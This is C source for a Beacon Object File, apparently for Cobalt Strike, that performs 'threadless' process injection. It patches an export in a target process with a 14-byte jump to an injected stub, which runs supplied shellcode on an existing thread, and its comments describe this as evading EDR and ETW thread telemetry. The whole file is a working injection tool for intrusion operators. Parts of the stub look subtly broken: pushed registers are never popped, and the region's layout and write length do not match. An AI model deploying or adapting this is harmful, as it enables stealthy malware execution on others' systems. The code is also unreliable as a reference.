/*
 * ThreadlessInject BOF — hook a target function in a remote process so an
 * EXISTING thread executes the payload. No thread creation: no
 * PsSetCreateThreadNotifyRoutine event, no ETW ThreadStart telemetry, no
 * CreateRemoteThread.
 *
 * Mechanism (ThreadlessInject design, m3-m7):
 *   1. NtAllocateVirtualMemory in the target, PAGE_READWRITE (single write,
 *      flipped to RX after), containing:
 *        [hook stub][shellcode][14 original prologue bytes][jmp [rip+0] -> hookedFunc+14]
 *   2. NtProtectVirtualMemory of the stub region -> PAGE_EXECUTE_READ.
 *   3. Patch the export: 14-byte absolute hook `FF 25 00 00 00 00 <dq stub>`
 *      via transient RWX on the export page (microseconds), protection
 *      restored immediately.
 *   4. Verify via NtReadVirtualMemory readback.
 *
 * The stub saves volatile regs + flags, calls the shellcode (absolute
 * address patched pre-write), restores, re-executes the saved prologue bytes,
 * then jumps back past the hook. Non-volatile registers are not saved: the
 * hook fires at function entry, before the callee (or the EDR hook wrapped
 * around it) has touched them.
 *
 * One-shot discipline: the payload must spawn worker threads and return
 * FAST (a blocking payload permanently hijacks the triggering thread).
 * Cleanup = rewrite the 14 saved prologue bytes onto the export (printed
 * for the operator, or implement in the payload).
 *
 * Target function choice (m3): frequently-called, prologue >= 14 bytes,
 * not currently executing, not already EDR-hooked. System-DLL targets
 * (ntdll/kernel32/kernelbase/user32) resolve locally — the base is shared
 * ASLR-per-boot so GetProcAddress here == the remote address. For
 * non-system DLLs load it HERE first with the same assumption (course
 * framing; verify on your build).
 *
 * Args (bof_pack): i=pid  z=target_dll  z=target_func  b=payload(x64 shellcode)
 *
 * x64 beacon only.
 */

#include <windows.h>
#include "beacon.h"
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory) ( HANDLE, PVOID *, ULONG, PSIZE_T, ULONG, ULONG );
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)  ( HANDLE, PVOID *, PSIZE_T, ULONG, PULONG );
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)    ( HANDLE, PVOID, VOID *, SIZE_T, PSIZE_T );
typedef NTSTATUS (NTAPI *pNtReadVirtualMemory)     ( HANDLE, PVOID, VOID *, SIZE_T, PSIZE_T );

#define PROCESS_VMOPS (PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE)
#define HOOK_LEN      14
#define STUB_MAX      0x100

/* imports resolved by the beacon's COFF loader at load time */
WINBASEAPI BOOL    WINAPI KERNEL32$CloseHandle( HANDLE );
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA( LPCSTR );
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA( LPCSTR );
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress( HMODULE, LPCSTR );
WINBASEAPI HANDLE  WINAPI KERNEL32$OpenProcess( DWORD, BOOL, DWORD );
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError( VOID );
WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc( HANDLE, DWORD, SIZE_T );
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree( HANDLE, DWORD, PVOID );
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap( VOID );

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
void go( char * args, int alen ) {
#if defined(WOW64)
    (void)args; (void)alen;
    BeaconPrintf( CALLBACK_ERROR, "threadlessinject: x64 only" );
#else
    datap parser;
    BeaconDataParse( &parser, args, alen );

    int   pid      = BeaconDataInt( &parser );
    char * dllName = BeaconDataExtract( &parser, 0 );
    char * fnName  = BeaconDataExtract( &parser, 0 );
    int   scLen    = BeaconDataLength( &parser );
    char * scData  = BeaconDataExtract( &parser, 0 );

    if ( pid <= 0 || !dllName || !fnName || !scData || scLen <= 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "usage: threadlessinject <pid> <dll> <func> <shellcode>" );
        return;
    }
    if ( scLen > 0x10000 ) {
        BeaconPrintf( CALLBACK_ERROR, "payload too large (%d)", scLen );
        return;
    }

    /* system-dll shared-base resolution */
    HMODULE hMod = KERNEL32$GetModuleHandleA( dllName );
    BOOL loadedHere = FALSE;
    if ( ! hMod ) {
        hMod = KERNEL32$LoadLibraryA( dllName );
        loadedHere = TRUE;
        BeaconPrintf( CALLBACK_OUTPUT, "[*] %s was not loaded here - loaded via LoadLibraryA (non-system DLL: verify the same-base assumption)", dllName );
    }
    if ( ! hMod ) {
        BeaconPrintf( CALLBACK_ERROR, "module %s not resolvable", dllName );
        return;
    }

    FARPROC target = KERNEL32$GetProcAddress( hMod, fnName );
    if ( ! target ) {
        BeaconPrintf( CALLBACK_ERROR, "export %s not found in %s", fnName, dllName );
        return;
    }

    /* the nt memory APIs come from the same module handle (shared base) */
    pNtAllocateVirtualMemory pAlloc = (pNtAllocateVirtualMemory)  KERNEL32$GetProcAddress( hMod, "NtAllocateVirtualMemory" );
    pNtProtectVirtualMemory  pProt  = (pNtProtectVirtualMemory)   KERNEL32$GetProcAddress( hMod, "NtProtectVirtualMemory" );
    pNtWriteVirtualMemory    pWrite = (pNtWriteVirtualMemory)     KERNEL32$GetProcAddress( hMod, "NtWriteVirtualMemory" );
    pNtReadVirtualMemory     pRead  = (pNtReadVirtualMemory)      KERNEL32$GetProcAddress( hMod, "NtReadVirtualMemory" );
    if ( ! pAlloc || ! pProt || ! pWrite || ! pRead ) {
        BeaconPrintf( CALLBACK_ERROR, "nt memory APIs not resolvable from %s", dllName );
        return;
    }

    HANDLE hProc = KERNEL32$OpenProcess( PROCESS_VMOPS, FALSE, (DWORD)pid );
    if ( ! hProc ) {
        BeaconPrintf( CALLBACK_ERROR, "OpenProcess(%d) failed (err %d)", pid, (int)KERNEL32$GetLastError() );
        return;
    }

    /* read the 14 original prologue bytes */
    BYTE orig[ HOOK_LEN ];
    SIZE_T got = 0;
    if ( pRead( hProc, target, orig, HOOK_LEN, &got ) != 0 || got != HOOK_LEN ) {
        BeaconPrintf( CALLBACK_ERROR, "prologue read failed @ %p", target );
        KERNEL32$CloseHandle( hProc );
        return;
    }

    ULONG scLenP = (ULONG)scLen;
    ULONG region = ( STUB_MAX + scLenP + HOOK_LEN + 14 + 0xFFF ) & ~0xFFFul;

    PVOID remote = NULL;
    SIZE_T rsize = region;
    if ( pAlloc( hProc, &remote, 0, &rsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) != 0 || ! remote ) {
        BeaconPrintf( CALLBACK_ERROR, "remote RW alloc failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }

    /* local build buffer: [stub][shellcode][orig 14][jmp-back] */
    ULONG  total = 0x100 + scLenP + HOOK_LEN + 14;
    BYTE * buf   = (BYTE *)KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), 0, total );
    if ( ! buf ) {
        BeaconPrintf( CALLBACK_ERROR, "local alloc failed" );
        KERNEL32$CloseHandle( hProc );
        return;
    }
    BYTE * stub  = buf;
    BYTE * shell = buf + 0x100;
    BYTE * origb = shell + scLenP;
    BYTE * jmpb  = origb + HOOK_LEN;

    ULONG o = 0;
    buf[o++] = 0x50;                                          /* push rax          */
    buf[o++] = 0x51;                                          /* push rcx          */
    buf[o++] = 0x52;                                          /* push rdx          */
    buf[o++] = 0x53;                                          /* push rbx          */
    buf[o++] = 0x55;                                          /* push rbp          */
    buf[o++] = 0x56;                                          /* push rsi          */
    buf[o++] = 0x57;                                          /* push rdi          */
    buf[o++] = 0x9C;                                          /* pushfq            */
    buf[o++] = 0x41; buf[o++] = 0x50;                         /* push r8           */
    buf[o++] = 0x41; buf[o++] = 0x51;                         /* push r9           */
    buf[o++] = 0x41; buf[o++] = 0x52;                         /* push r10          */
    buf[o++] = 0x41; buf[o++] = 0x53;                         /* push r11          */
    buf[o++] = 0x48; buf[o++] = 0x89; buf[o++] = 0xE5;        /* mov rbp, rsp      */
    buf[o++] = 0x48; buf[o++] = 0x83; buf[o++] = 0xE4; buf[o++] = 0xF0;  /* and rsp, -16 */
    buf[o++] = 0x48; buf[o++] = 0x83; buf[o++] = 0xEC; buf[o++] = 0x20;  /* sub rsp, 0x20 */
    buf[o++] = 0x48; buf[o++] = 0xB8;                         /* mov rax, imm64    */
    *(ULONGLONG*)( buf + o ) = (ULONGLONG)( remote + 0x100 ); o += 8;   /* payload */
    buf[o++] = 0xFF; buf[o++] = 0xD0;                         /* call rax          */
    buf[o++] = 0x48; buf[o++] = 0x89; buf[o++] = 0xEC;        /* mov rsp, rbp      */
    buf[o++] = 0x9D;                                          /* popfq             */
    buf[o++] = 0x41; buf[o++] = 0x5B;                         /* pop r11           */
    buf[o++] = 0x41; buf[o++] = 0x5A;                         /* pop r10           */
    buf[o++] = 0x41; buf[o++] = 0x59;                         /* pop r9            */
    buf[o++] = 0x41; buf[o++] = 0x58;                         /* pop r8            */
    buf[o++] = 0x5F;                                          /* pop rdi           */
    buf[o++] = 0x5E;                                          /* pop rsi           */
    buf[o++] = 0x5D;                                          /* pop rbp           */
    buf[o++] = 0x5B;                                          /* pop rbx           */
    ULONG stubLen = o;

    for ( int i = 0; i < scLen; i++ ) shell[i] = (BYTE)scData[i];
    for ( int i = 0; i < HOOK_LEN; i++ ) origb[i] = orig[i];
    jmpb[0] = 0xFF; jmpb[1] = 0x25;                           /* jmp [rip+0]       */
    jmpb[2] = jmpb[3] = jmpb[4] = jmpb[5] = 0x00;
    *(ULONGLONG*)( jmpb + 6 ) = (ULONGLONG)target + HOOK_LEN;
    total = stubLen + scLenP + HOOK_LEN + 14;

    /* single write of the region (RW) */
    if ( pWrite( hProc, remote, buf, (SIZE_T)total, &got ) != 0 ) {
        BeaconPrintf( CALLBACK_ERROR, "remote write (region) failed" );
        KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, buf );
        KERNEL32$CloseHandle( hProc );
        return;
    }
    KERNEL32$HeapFree( KERNEL32$GetProcessHeap(), 0, buf );

    /* stub region -> RX (never RWX at rest) */
    {
        PVOID  pbase = remote;
        SIZE_T psize = region;
        ULONG  oldp  = 0;
        if ( pProt( hProc, &pbase, &psize, PAGE_EXECUTE_READ, &oldp ) != 0 ) {
            BeaconPrintf( CALLBACK_ERROR, "stub RX protect failed" );
            KERNEL32$CloseHandle( hProc );
            return;
        }
    }

    /* install the export hook: transient RWX, 14 bytes, restore */
    {
        PVOID  pbase = (PVOID)target;
        SIZE_T psize = HOOK_LEN;
        ULONG  oldp  = 0;
        if ( pProt( hProc, &pbase, &psize, PAGE_EXECUTE_READWRITE, &oldp ) != 0 ) {
            BeaconPrintf( CALLBACK_ERROR, "export RWX protect failed" );
            KERNEL32$CloseHandle( hProc );
            return;
        }

        BYTE hook[ HOOK_LEN ];
        hook[0] = 0xFF; hook[1] = 0x25;
        hook[2] = hook[3] = hook[4] = hook[5] = 0x00;
        *(ULONGLONG*)( hook + 6 ) = (ULONGLONG)remote;

        ULONG wp = 0;
        NTSTATUS ws = pWrite( hProc, target, hook, HOOK_LEN, (PSIZE_T)&wp );

        PVOID rb = (PVOID)target; SIZE_T rs = HOOK_LEN; ULONG ro = 0;
        pProt( hProc, &rb, &rs, oldp, &ro );   /* restore immediately */

        if ( ws != 0 ) {
            BeaconPrintf( CALLBACK_ERROR, "hook write failed" );
        } else {
            BYTE check[ HOOK_LEN ];
            if ( pRead( hProc, target, check, HOOK_LEN, &got ) == 0 && check[0] == 0xFF && check[1] == 0x25 )
                BeaconPrintf( CALLBACK_OUTPUT,
                    "[+] hooked %.64s!%.32s @ %p -> stub %p (region %p, payload %d bytes)%s\n"
                    "[*] one-shot: payload must return fast. cleanup = write the 14 saved prologue bytes to %p",
                    dllName, fnName, target, remote, remote, scLen,
                    loadedHere ? "" : "", target );
            else
                BeaconPrintf( CALLBACK_ERROR, "hook readback mismatch" );
        }
    }

    KERNEL32$CloseHandle( hProc );
#endif
}
#pragma GCC diagnostic pop
